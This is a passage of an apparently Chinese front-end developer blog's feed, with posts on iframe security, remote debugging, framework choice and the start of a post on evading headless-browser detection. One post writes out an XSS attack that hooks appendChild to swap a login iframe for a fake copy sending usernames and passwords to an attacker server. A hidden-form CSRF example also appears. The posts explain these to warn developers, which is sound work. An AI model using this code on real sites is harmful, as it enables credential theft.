class="number">0</span>].style.backgroundColor = <span class="string">"#ff6700"</span>;</span><br><span class="line"><span class="comment">// 操作变量</span></span><br><span class="line">parentWindow.arr1=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line">parentWindow.arr1.push(<span class="string">'Eva'</span>);</span><br><span class="line"><span class="comment">// 也能直接操作父frame的location，所以一定要注意iframe安全</span></span><br><span class="line">parentWindow.location.href =<span class="string">'https://evacoder.com'</span>;</span><br></pre></td></tr></table></figure><h4 id="子frame操作相邻-frame"><a href="#子frame操作相邻-frame" class="headerlink" title="子frame操作相邻 frame"></a>子frame操作相邻 frame</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> siblingWindow = <span class="built_in">window</span>.parent.frames[<span class="number">1</span>];</span><br><span class="line">siblingWindow.document.body.style.backgroundColor = <span class="string">'#ff5700'</span>;</span><br><span class="line">siblingWindow.arr1 = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line">siblingWindow.arr1.push(<span class="string">'Eva'</span>);</span><br><span class="line"><span class="comment">// 也能直接操作siblings frame的location，所以一定要注意iframe安全</span></span><br><span class="line">siblingWindow.location.href =<span class="string">'https://evacoder.com'</span>;</span><br></pre></td></tr></table></figure><p>如此看来也没什么特别的，互相都可以操作，但是加上跨域就有所限制了。</p><h4 id="iframe-FAQ"><a href="#iframe-FAQ" class="headerlink" title="iframe FAQ"></a>iframe FAQ</h4><p>1<strong>.跨域情况下父子frame可以修改互相操作dom么？</strong></p><p>不行，为了安全，父子frame之间都不可互相操作dom，遵循同源策略。</p><p>但是如果一定要实现父子通信的功能，就需要另开一篇来说iframe跨域的解决方案了，主要使用 post message，先不展开细说。</p><p>2<strong>.跨域情况下子frame可以修改父window的location吗？如何禁止？</strong></p><p>可以，虽然跨域情况下不能dom操作，读取<code>parent.location.href</code>都做不到，但神奇的是却可以直接设置parent.location.href，修改父window的location。</p><p>在新版chrome会提示需要有用户交互的时候才能触发跳转，只要加上按钮引导用户点击还是可以实现跳转。</p><p>总之不是自己管理的页面都不是可信的，为了防止我们内嵌的子页面被坏人篡改或有其他漏洞，我们最好要防止内嵌的iframe修改我们的页面。</p><p>可以通过HTML5的新特性<code>sandbox</code>属性来限制iframe的行为，这个属性是反向的，如果空字符串则会应用所有的限制，sandbox包含的属性会移除对应的限制。</p><table><thead><tr><th style="text-align:left"><code>&quot;&quot;</code></th><th style="text-align:left">应用以下所有的限制。</th></tr></thead><tbody><tr><td style="text-align:left">allow-same-origin</td><td style="text-align:left">允许 iframe 内容被视为与包含文档有相同的来源。</td></tr><tr><td style="text-align:left">allow-top-navigation</td><td style="text-align:left">允许 iframe 内容从包含文档导航（加载）内容。</td></tr><tr><td style="text-align:left">allow-forms</td><td style="text-align:left">允许表单提交。</td></tr><tr><td style="text-align:left">allow-scripts</td><td style="text-align:left">允许脚本执行。</td></tr></tbody></table><p>如果不开放allow-scripts权限，iframe中的任何js都执行不了，那会造成功能失效，不是我们的初衷。</p><p>其他权限可以按需打开，只要不加上allow-top-navigation，内嵌iframe就无法操作我们的页面</p><p>所以我们需要在引入iframe处添加</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=<span class="string">"iframe.html"</span> sandbox=<span class="string">"allow-scripts allow-forms"</span>&gt;</span><br></pre></td></tr></table></figure><p>内嵌的iframe就无权限修改我们页面的地址了，如果加上了<code>sandbox=&quot;allow-top-navigation&quot;</code>则会恢复权限。</p><p>但是在实际中大部分 iframe 都没有设置 sandbox 属性。</p><p><code>allow-same-origin</code>一看就很有意思，我们将在后文中提到。</p><p>插播一个，这种父子 frame 的关系和 window.open()打开的页面也有相似之处，有一个注意点是如果使用<code>target=&#39;_blank&#39;</code>打开别人的网站，一定要注意别人同样可以通过<code>window.opener</code>来控制你的网站</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.opener.location=<span class="string">'https://evacoder.com'</span>;</span><br></pre></td></tr></table></figure><p>一般人都不会想到后打开的页面居然可以控制原始页面</p><p>为了限制<code>target=&#39;_blank&#39;</code>打开的页面通过<code>window.opener</code>控制父页面，可以加上以下代码，阻止被打开的页面控制原页面。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">target</span>=<span class="string">'_blank'</span> <span class="attr">rel</span>=<span class="string">'noreferrer noopener'</span> <span class="attr">href</span>=<span class="string">'https://www.otherpage.com'</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">// noreferrer 针对firefox，noopener 针对其他</span><br></pre></td></tr></table></figure><p>3<strong>.如何防止自己的页面被嵌在iframe中？</strong></p><p>在上一篇文章中，我们提到了为了安全禁止了登录页被嵌在iframe中，但是一般更多的是为了预防点击劫持（clickjacking）的考虑。</p><p>如果我们有个广告页，需要靠点击量来计费，坏人把我们的页面放在一个透明度为0的iframe中，用户就可能无感知的情况下点击，广告费就猛增。</p><p>以前的做法一般是通过js在页面中加入</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (top !== self) &#123;</span><br><span class="line">  top.location = location</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>就可以保证自己始终是在顶层窗口中显示，就避免了被内嵌在别人的页面中。</p><p>但是现在一般都通过服务端直接设置<code>X-Frame-Options：SAMEORIGIN</code>响应头来只允许被同域的页面内嵌。</p><p><strong>4.post请求可以跨域么？</strong></p><p>为何有这样一个问题呢？</p><p>因为了解CSRF攻击的小伙伴都知道，坏人可以在我们的页面中通过 <code>new Image().src=&#39;evacoder.com/getMoney&#39;</code> 带着我们页面中的cookie直接发出请求，但是通过img，script这类都只能发出 GET 请求。</p><p>我们常说的浏览器有跨域请求限制，实际上是 AJAX 不能跨域，这里的跨域也只是说获取不到请求的响应结果，但我们可以用 古老的form 表单来跨域，在 iframe 中提交，还可以做到form表单提交而且页面不刷新</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe style=<span class="string">"display:none"</span>&gt;</span><br><span class="line">  &lt;form method=<span class="string">"POST"</span>　action=<span class="string">"http://api.mi.com"</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">"hidden"</span> name=<span class="string">"other"</span> value=<span class="string">"XXX"</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">"hidden"</span> name=<span class="string">"money"</span> value=<span class="string">"10000"</span>&gt;</span><br><span class="line">　&lt;<span class="regexp">/form&gt;</span></span><br><span class="line"><span class="regexp">&lt;/i</span>frame&gt;</span><br></pre></td></tr></table></figure><p>但是需要注意的是，AJAX跨域限制只是浏览器不给JS处理响应的结果而已，所以上面的办法其实没有那么厉害，直接AJAX POST也能发送跨域请求。所以我们还需要其他的措施来防止CSRF攻击。</p><p><strong>5.可以在iframe的引用页修改iframe元素的样式吗？</strong></p><p>比如我用了google reCAPTCHA的sdk，出来的验证码是通过iframe加载的，我想要修改google的样式。</p><p>如上文所述，跨域了是不能进行 DOM 操作的，不然会有严重的安全问题，post message 也只是能在页面间传递信息而已。</p><p><strong>6.iframe 影响了类型判断</strong></p><p>在使用 iframe 时，每个frame 定义的全局变量会自动成为该 frame 中window的全局属性，而每个window对象都包含原生类型的构造函数，window对象都不相等，window.Array 和 window.frames[0].Array当然是不等的，所以会出现古怪的bug。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> el = <span class="built_in">document</span>.createElement(<span class="string">'iframe'</span>);</span><br><span class="line"><span class="built_in">document</span>.body.appendChild(el);</span><br><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"><span class="built_in">console</span>.log(arr <span class="keyword">instanceof</span> <span class="built_in">Array</span>); <span class="comment">// true</span></span><br><span class="line"><span class="built_in">console</span>.log(arr <span class="keyword">instanceof</span> <span class="built_in">window</span>.frames[<span class="number">0</span>].Array); <span class="comment">// false</span></span><br></pre></td></tr></table></figure><p>虽然我们一般不会如上面的例子那样去判断arr是不是别的frame下的Array，常用的场景是在iframe中获取parent frame的某个arr来进行类型判断，这样通过 instanceof 来判断对象的class就会出现出人意料的bug。</p><p>所以建议使用<code>Array.isArray(arr)</code>或者<code>toString.call(arr)===&#39;[object Array]&#39;</code>来判断类型。</p><p><strong>7.iframe的使用场景</strong></p><p>iframe 早已成为浏览器的规范实现，所以兼容性其实还可以，可以放心使用。</p><p>早年 iframe 经常被用在后台管理系统中的 navbar和 siderbar 的实现，主要是为了复用，现在早就不建议这么做了。</p><p>iframe 最大的好处是它一个独立的运行环境，邮箱框架中使用的比较多。</p><p>我接触到的有用在无刷新文件上传和登录页定制化（背景图开放给第三方上传管理）。</p><p><strong>8.<code>target=&quot;_blank&quot;</code></strong><br>今天突然发现引入的google reCAPTCHA iframe里的a链接：“常见问题”点完的效果是直接打开一个tab，原来<strong>iframe不仅能修改父frame的location，还可以打开一个新的tab</strong>，同样是如2中所述，加上sandbox属性可以禁止。</p><p>具体可以参考 <a href="https://www.zhihu.com/question/20653055" target="_blank" rel="noopener">知乎：iframe 的好处和坏处</a> 可以了解些历史故事，但是如果有其他替代方案最好还是不要使用 iframe。</p><p>参考</p><p><a href="https://www.zhihu.com/question/20653055" target="_blank" rel="noopener">知乎：iframe 的好处和坏处</a><br><a href="https://zhuanlan.zhihu.com/p/38538801" target="_blank" rel="noopener">Chrome 将默认屏蔽“非用户行为触发”的父页面跳转</a></p><p>想到其它有意思的点再补充吧~</p>]]></content>
      
      
      
        <tags>
            
            <tag> HTML </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>「 工具 」前端远程调试及空白或404解决</title>
      <link href="/2019/02/17/remote_debugging/"/>
      <url>/2019/02/17/remote_debugging/</url>
      
        <content type="html"><![CDATA[<p>因为自己的开发环境搭建的太舒适，在别人的电脑上查问题感觉完全无法展现自己的能力。</p><p>再加上已经习惯了chrome dev tool的每一种功能，一换到safari上查兼容性问题，都感觉自己变成了白痴。</p><p>更不要说去测试webview里的问题，console都没法看，真的要一行一行alert吗？</p><p>啥？你居然不会remote debugging！</p><p>那你怎么证明到底是你还是native 开发的锅？啥证据都没有。</p><p>虽然模拟器也能完成调试的功能，但是不能完全依赖模拟的结果，而且有些特定的机型并没有模拟器，有时候必须要在真机上复现问题，最重要的是模拟器没有chrome devtools呀。</p><a id="more"></a><h4 id="Andriod"><a href="#Andriod" class="headerlink" title="Andriod"></a>Andriod</h4><p>其实这个配置非常简单，用起来也方便，小伙伴们主要遇到的就是打开页面空白或者404的问题。</p><p>所以最重要的是要检查下PC能否科学地 <strong>网上冲浪</strong></p><p>有时候能访问google都不一定成功，需要试下这个地址</p><p><a href="https://chrome-devtools-frontend.appspot.com/" target="_blank" rel="noopener">https://chrome-devtools-frontend.appspot.com/</a></p><p>如果不行的话，配置以下host(不定期失效，需要保证 <a href="https://chrome-devtools-frontend.appspot.com/" target="_blank" rel="noopener">https://chrome-devtools-frontend.appspot.com/</a> 可以访问即可)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">172.217.161.180 chrome-devtools-frontend.appspot.com</span><br><span class="line">172.217.161.180 chrometophone.appspot.com</span><br></pre></td></tr></table></figure><p>现在访问基本上是秒开啦。</p><p>访问：<code>chrome://inspect/#devices</code></p><p>然后就可以方便的调试了。</p><p>1.在开发者模式下允许通过usb来调试</p><p>2.重新连接下usb</p><p><img src="/images/remote_debugging1.png" alt=""></p><p>出现上图，点击inspect就可以开始调试啦。</p><p>不必安装chrome浏览器，其他的浏览器和webview都可以进行调试。</p><p>如果webview测试不了，还需要<strong>安卓开发同学配置下允许调试</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WebView.setWebContentsDebuggingEnabled(<span class="keyword">true</span>);</span><br></pre></td></tr></table></figure><h4 id="iOS"><a href="#iOS" class="headerlink" title="iOS"></a>iOS</h4><p>iOS的remote debugging比较难，难在首先你需要一台mac哈哈哈，但是mac却可以直接调试Andriod。</p><p>1.iPhone上设置-&gt;Safari-&gt; 高级-&gt; Web 检查器，打开</p><p>2.mac 上 safara-&gt;偏好设置-&gt;高级-&gt;在菜单栏显示“开发”菜单</p><p>3.usb连接两者</p><p>4.打开 mac safari，顶部菜单中的开发，选择设备点开即可<br><img src="/images/remote_debugging2.png" alt=""></p><p>也是可以调试webview，safari</p><p>掌握了远程调试的技能，基本可以解决大部分移动端相关的问题了。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Tool </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>「 基础设施 」 技术选型之路</title>
      <link href="/2019/02/16/frameworks_selection/"/>
      <url>/2019/02/16/frameworks_selection/</url>
      
        <content type="html"><![CDATA[<p>这篇文章是个吐槽文，小伙伴们看着玩儿吧，更希望你们能跟我分享你的观点。</p><h4 id="引子"><a href="#引子" class="headerlink" title="引子"></a>引子</h4><p>之前有个四年换了五份工作的技术leader，过来给我们技术分享，实际也没讲什么技术，因为主要是内部后台管理系统，主要分享了下团队管理。</p><p>他说我的团队成员很幸福，我们不用antd，不好用，我自研了ui框架，小弟们只需要搭积木一样搭起来就可以了。我招的人都学会了这个框架，每次我换工作都带着他们一起换。</p><a id="more"></a><p>因为是自研框架，自己很清楚哪里有问题，很easy就改了。</p><p>之前上一个前端团队说，这个实现不了，那个也实现不了，我们每次都能保质保量的完成，让大家都很满意。</p><p>老板问我工期，我说四周，老板说四周能行吗？给你六周吧。（下面的人说，你们老大一定不懂前端哈哈哈）</p><p>实际上我们一周就完成了，剩下的时间想干啥就干啥，这就是自己造的轮子的好处。</p><p>（时间比较久了，可能记得没那么清楚了，如果这位兄弟出来辟谣，请以他说的为准）</p><p>那我们就假设有这么个人吧，反正肯定有这样的人。</p><p>听完真的很刷新我的三观，可能这就是这位兄弟的目的，总是这么语出惊人。虽然带了调侃的语气，但是还是有些不能接受。</p><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>一可能是我也工作快三年了，还觉得自己是个小白，有好多知识需要学习，总是带着谦卑的心去跟任何人学习，依然是一线码农（倒也并不是排斥这个身份），身边的同事们也都是这样啊，没什么好狂的，可能是有些羡慕？</p><p>二是真心觉得这样和包工头带着工程队有啥区别呢？看看这个leader四年换五份工作，轻轻松松走上人生巅峰，那自研框架的文档完善吗？代码质量值得信赖吗？测试都跑通了吗？你觉得你的框架写的好，又没有开源接受大家的检验。接手者为了扩展新需求还要去学习你写的代码，而且更惨的是他们写了好多系统，如果是不同的人来维护接手，都需要来搞懂他们的代码。</p><p>三是这对他的小弟和未来的接手者都不是好事，搞懂他的代码有啥用呢？有这时间还不如去研究vue，react的源码。小弟们天天搭积木有啥进步呢？换下一家公司之后之前的工作经验都化为灰烬，你再知道那个自研框架哪里有坑都等于0，还不如和别的前端小伙伴津津乐道下当前最流行的框架有什么坑呢！如果小弟们带着这个自研框架去别的公司那就更可怕了，又去祸害别人？</p><p>四是虽然之前觉得狗东的二五原则有点扯，但是有些东西你不深入dive in 进去研究几年，总是浮在最表层，只是自己的简历上增加几个无意义的项目而已。超哥老是吐槽我，你怎么还在写登录页啊，我只能说嗯，我以后就有十年写登录页的经验了，花式写登录页。</p><p>跟着这样的老大可能工作很愉快，天天有段子听，有时间学习，但是并不是每个人都能保持学习的，有时候很多人的学习也就是只在工作中学习，而且他说招的都是应届生，这对应届生的发展更是非常不利。</p><p>反正我们真的应该警惕这样的老大。</p><h4 id="期望"><a href="#期望" class="headerlink" title="期望"></a>期望</h4><p>我的第一份工作虽然不是什么大厂，但是很庆幸一开始就遇到拎得清的老大，实名感谢。他虽然是个后端架构师，但是一开始就主张不要使用内部框架而是领先使用Angular，有什么坑他来扛。</p><p>虽然他也跟我说这有点面向简历编程，但是这对你们来说是好事，虽然大部分人的工作其实都是搬砖，内部框架你玩得再6，一换工作，你所有的积累都化为0，如果一直使用的是有影响力的开源框架，至少下一份工作你能说你最起码用过某个主流框架。</p><p>最开始就听leader说赶进度三个人一天写了三百个页面还觉得很震惊。其实即使不使用任何框架，大牛们写好基础组件，搭积木一样，天天ctrl +C+V，完全是正常的。</p><p>超哥也跟我说，一般人工作到一定的阶段都会感觉到没开始那么难，因为你对代码越来越熟悉，你知道哪里有坑，不可能一直都是搬砖状态。想想也是，上文中如果直接使用antd，只不过需要写些扩展组件，小弟们后来也一样能六周变一周，有时间读源码，再安排些真正的技术分享，简直是一个应届生最大的幸运。</p><p>小伙伴吐槽来了个领导是阿里的，之前用weex，所以现在他们也开始招weex开发，好歹weex也是开源的，（他说其实阿里自己都快不用weex了？不了解，待考）。技术选型用啥其实我们作为小白的时候也做不了主，但是可以用来做找工作的重要考核，而且希望看到这篇文章的你们以后当了leader之后在技术选型上也能慎重。</p><p>再就是我虽然建议选主流框架，但并不是说原生js的实践能力不重要，作为一个前端，<strong>这是最最重要的基本功。</strong></p><p>只是有的时候你会发现自己写的框架自己看了都恶心，最重要的是还特别大，实际上你清醒一点，vue只有39kb，jquery只有36kb，比你自己写的东一榔头西一锤子要好。当然啦，你可以写着玩儿，但是公司雇你来不是让你玩儿的哈哈哈。为了提高技术我们真的应该自己研究下框架是咋实现的，但是要对自己的实现负责，不要强迫别人来研究你写的框架，使用了框架自己整理util，mixin还是必不可少的。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>有人说，你们前端的kpi就是隔几年就换个框架全部重构一遍来完成的，哟呵，这都被你发现了。</p><p>其实也不是我们的问题，只是JS不像其他语言那样有自己的核心库，需要依赖一些外部框架，二是前端发展确实太快了，总有新框架新方案解决新问题，但是每年重构换框架，哪有那么容易。</p><p>为了不被别人鄙视，真的应该好好读读源码。</p><p>今天吐槽先到这里吧，最后的结论是啥呢。</p><p>老是有小伙伴说没有机会去实践主流框架，内部管理系统是干啥的？</p><p>总之记住一条原则：<strong>不要拿外部有影响力的项目来练手，在内部系统中使用新技术做一些有趣的尝试，积累经验踩过坑之后再用在外部系统中。</strong></p><p>每日写文吐槽：</p><p>吐槽文写的就是畅快，很easy就写完了。其实很喜欢现在的工作状态，有时间全面了解知识并实践，和刚开始写不出来文章相比，已经积累了很多选题，就是需要时间完善整理。</p><p>我知道我的排版丑，如果有思维导图就更好，也知道哪里去找好看不侵权的图，用什么工具来画图，作为一个前端还想做自己的主题（答应超哥2年了也没写），还准备要咨询专业写公众号的毛毛来学习排版。</p><p>先弱弱地找个借口，现在还没走上正轨，但我一向是一个守诺的人，周末了，能有个时间来缓冲，希望大家监督</p>]]></content>
      
      
      
        <tags>
            
            <tag> Team </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>「 安全 」从iframe说到万物皆可hook</title>
      <link href="/2019/02/15/iframe_security/"/>
      <url>/2019/02/15/iframe_security/</url>
      
        <content type="html"><![CDATA[<h4 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h4><p>今天遇到有业务要求我们的登录页允许被嵌在 iframe 中以满足导流需求，找安全的大佬们讨论了下，最后给出的结论是：</p><blockquote><p>如果业务方的代码写的挫了点，有 xss 漏洞的话，坏人完全可以把你本来的 iframe 隐藏掉，自己写个弹框出来，这样的话用户完全无感知地被篡改了，直接输入用户名和密码，信息就被上送到了坏人的服务器。</p></blockquote><p>what？还能这样吗？ 那得写多少代码才能覆盖掉弹窗再伪造一个出来啊！</p><p>作为一个小白我算是长见识了。但是经过尝试，其实并不是那么回事。<br><a id="more"></a></p><h4 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h4><p>但是作为一个与用户交互最紧密的前端，登录页总是302跳转到新的页面对于用户来说其实是非常不友好的，打断了用户操作，跳过去跳过来的都晕了，如果能够弹窗登录，那抢手机的路上将一气呵成，非常愉快呀！<br>弹窗登录一般都是 iframe 实现的，因为大家一般都是 sso 登录，也就是说要做出一个通用的框架，所以一般使用 iframe。</p><p>我弱弱的说了句，嗯，百度好像也是 iframe 呀，其他也有很多厂商是 iframe 的，这样的问题并不是很严重吧。<br>没想到大佬们立刻就开始研究百度的弹窗。结论是：<br>做的很巧妙啊！点击之后才出弹窗，xss 一般都是一开始就进行篡改，但是这种方式的话，坏人没办法获取用户点击【登录】的时机，这样应该没那么容易篡改。</p><h4 id="万物皆可hook"><a href="#万物皆可hook" class="headerlink" title="万物皆可hook"></a>万物皆可hook</h4><p>听得有点懵，后来才明白，他们就是想hook用户点击登录的click事件。</p><p>哈哈，术业有专攻。终于轮到我们前端大展身手的时候了，他们是不知道我们的【万物皆可hook】定理。</p><p>千千音乐盒为例：<br><img src="/images/qian1.png" alt=""></p><p>点击登录之后，弹出了iframe，这时候一般都会有服务器交互，我们先看看chrome devtool的network，但是出现了好多条请求。这时候我们右键单击审查元素，看看iframe的src，其实凭经验来说，这种弹窗一般都是调用document.body.appendChild来添加在页面中，但是有更好的方法来佐证。</p><p><img src="/images/qian3.png" alt=""><br>重要小tips：network中的Initiator会展示出发出请求的具体代码行数，点击一下就可以定位到具体是哪一行发出了这个请求。代码一般都压缩了的，点击下面的{}就可以格式化代码。果不其然，就是调用了appendChild，再看下html结构，显然是在append在body中的。</p><p>感兴趣的可以查看chrome devTool的使用（TODO）。</p><p>既然锁定了调用的是document.body.appendChild，那我们就可以放心的hook啦！<br>核心代码很简单，就是使用了js的call方法。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> append = <span class="built_in">document</span>.body.appendChild;</span><br><span class="line"><span class="built_in">document</span>.body.appendChild = <span class="function"><span class="keyword">function</span>(<span class="params">el</span>) </span>&#123;</span><br><span class="line">  alert(<span class="string">'hook success'</span>);</span><br><span class="line">  append.call(<span class="built_in">document</span>.body, el);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>我们成功的hook了document.body.appendChild方法，在执行原来操作方式之前执行了我们的alert。</p><p>大佬要求我完整的实现隐藏原来的弹窗，弹出自己实现的弹窗。</p><p>那代码量应该不少吧。我们xss只能插入js，插入不了css，即使实现了也应该很丑吧。</p><p>no，no，no。</p><p>js啥都能插入!</p><p>html</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">const fakeIframe = document.createElement(&apos;div&apos;);</span><br></pre></td></tr></table></figure><p>css</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fakeIframe.style= &apos;border:1px solid #f8f8f8&apos;;</span><br></pre></td></tr></table></figure><p>就是需要写好多dom操作的代码。</p><p>or 直接<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fakeIframe.innerHTML=&apos;&lt;iframe allowtransparency=&quot;true&quot; style=&quot;border:0px none;position:absolute;top:0;left:0; width:100%;height:100%;&quot;</span><br><span class="line">src=&quot;//passport.taihe.com/v2/web/popLogin.html?target=pop&amp;amp;u=https%3A%2F%2Fplay.taihe.com&amp;amp;staticPage=https%3A%2F%2Fplay.taihe.com%2Fplayer%2Ftpassjump.html&amp;amp;callback=tpass15504710495271&amp;amp;tpl=baidu_music&quot;&gt;</span><br><span class="line">&lt;/iframe&gt;&apos;;</span><br></pre></td></tr></table></figure></p><p>本来打算自己写个iframe 登录页，转念一想，直接把他的页面copy出来算了，美观靠谱又省事儿。<br>打开//passport.taihe.com/v2/web/popLogin.html，chrome dev tool network，copy出popLogin.html的代码。<br>加上</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">'.tpass-button'</span>).on(<span class="string">'click'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  $.ajax(&#123;</span><br><span class="line">    url: <span class="string">'/badEva/collect'</span>,</span><br><span class="line">    type: <span class="string">'POST'</span>,</span><br><span class="line">    data: &#123;</span><br><span class="line">      username: $(<span class="string">'.tpass-text-input-userName'</span>).val(),</span><br><span class="line">      pwd: $(<span class="string">'.tpass-text-input-password'</span>).val(),</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>部署在自己的server上，得到url如//passport.badeva.com/fakeLogin.html</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> append = <span class="built_in">document</span>.body.appendChild;</span><br><span class="line"><span class="built_in">document</span>.body.appendChild = <span class="function"><span class="keyword">function</span>(<span class="params">el</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> fakeIframe = <span class="built_in">document</span>.createElement(<span class="string">'div'</span>);</span><br><span class="line">  fakeIframe.innerHTML = <span class="string">'&lt;iframe allowtransparency="true" style="border:0px none;position:absolute;top:0;left:0; width:100%;height:100%;" src="//passport.badeva.com/fakeLogin.html" &gt;&lt;/iframe&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>理论上四行代码就可以搞定了。</p><p>其实还有很多技术点可以细挖，先不展开说了。</p><h4 id="回溯"><a href="#回溯" class="headerlink" title="回溯"></a>回溯</h4><p>回想起来，这些思路还是来自于hook极验验证结果时得出来的。</p><p>引入了极验的sdk，但是用户每次滑动点选的结果对接入方来说是透明的，但是我们需要这些数据来进行分析，怎么才能得到用户每次验证的结果呢？</p><p>大家都说，页面都是你的页面，连个结果都获取不到？？？</p><p>计算每次的轨迹？</p><p>思考良久，脑子里突然闪过iOS里的method swizzling，具体是干啥的也不记得了，只记得method swizzling 黑魔法。</p><p>我的地盘我做主，怎么可能获取不到呢？</p><p>脑子里又闪过hook这个词。</p><p>对了，他们总是要给服务端结果的啊！hook他们的请求！</p><p>跨域只能jsonp，jsonp一般都是document.header.appendChild，轻轻松松得到结果，具体代码你可以自己试着写写。</p><p>但是随着时代的进步，极验也换用了CORS来进行跨域，hook Ajax就没有那么容易了。</p><h4 id="展望"><a href="#展望" class="headerlink" title="展望"></a>展望</h4><p>大佬们很震惊，难道没有别的办法可以防止被hook吗？其实我们还是希望可以使用iframe来提升用户体验的。</p><p>但事实上js注入之后，可以做的事儿太多了。弹出iframe绕不过appendChild那些基础API，有xss漏洞就相当于敞开大门让坏人进来。</p><p>几乎是防不胜防。</p><p>所以更是提醒我们为了安全：</p><p>1.要尽量避免xss漏洞，请看这篇（TODO）</p><p>2.引入第三方js，一定要注意查看下network中是否有什么不清不楚的接口，偷偷的搜集了某些信息上送给别的服务端。</p><p>从这篇文章获取到的，你可以自己总结下。<br>顺便思考下hook Ajax的方法。</p><h4 id="彩蛋"><a href="#彩蛋" class="headerlink" title="彩蛋"></a>彩蛋</h4><p>虽然很绝望，但是首先，你需要一个xss漏洞。</p><p>大佬们微微一笑，xss漏洞远比你想象的多得多，即使简单的一个登录页就这段时间都检测出来了好多xss漏洞。</p><p>iframe白名单这个口子真的不能那么容易就打开呀，公司其实有很多赶工期的项目，开发周期短，代码写成啥样大家都懂，其实很容易出现xss漏洞。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Security </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>「 puppeteer 」从puppeteer谈前端爬虫检测和绕过</title>
      <link href="/2019/02/14/js_check_spider/"/>
      <url>/2019/02/14/js_check_spider/</url>
      
        <content type="html"><![CDATA[<p>检测Headless Chrome/ webdriver/ selenium/ puppeteer</p><p>爬虫检测是一个攻防的过程，js是裸露在外的，在坏人手里的，我们只能想办法提高作恶的成本。</p><p>各处搜集整理信息了很久，后来发现 <a href="https://intoli.com/blog/not-possible-to-block-chrome-headless/" target="_blank" rel="noopener">这篇文章</a> 讲的非常清楚，本地化一下，加上一些自己的理解。</p><p>phantom，webdriver，puppeteer等爬虫都有设置的方法，本文主要从puppeteer来分析。</p><a id="more"></a><h4 id="1-navigator-userAgent"><a href="#1-navigator-userAgent" class="headerlink" title="1.navigator.userAgent"></a>1.navigator.userAgent</h4><p>防：<code>/HeadlessChrome/.test(window.navigator.userAgent)</code>一般判断ua中有headless字样都没跑了，肯定是爬虫。<br>攻：puppeteer可以设置ua，甚至直接设置device。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> page.setViewport(conf.viewport);</span><br><span class="line"><span class="keyword">await</span> 